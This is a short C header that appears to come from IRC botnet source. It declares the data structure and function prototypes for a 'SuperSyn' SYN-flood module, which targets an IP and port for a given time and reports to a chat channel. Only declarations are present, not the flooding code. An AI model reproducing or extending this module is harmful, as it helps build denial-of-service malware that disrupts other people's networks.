

#ifndef NO_SUPERSYN
typedef struct SUPERSYN {

	SOCKET sock;
	char ip[128];
	char port[128];
	char length[128];
	char chan[128];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SUPERSYN;

DWORD WINAPI SuperSynThread(LPVOID param);
long SuperSynSend(unsigned long TargetIP, unsigned short TargetPort,int Times);
long SuperSyn(char *target, char *port, char *len);
#endif
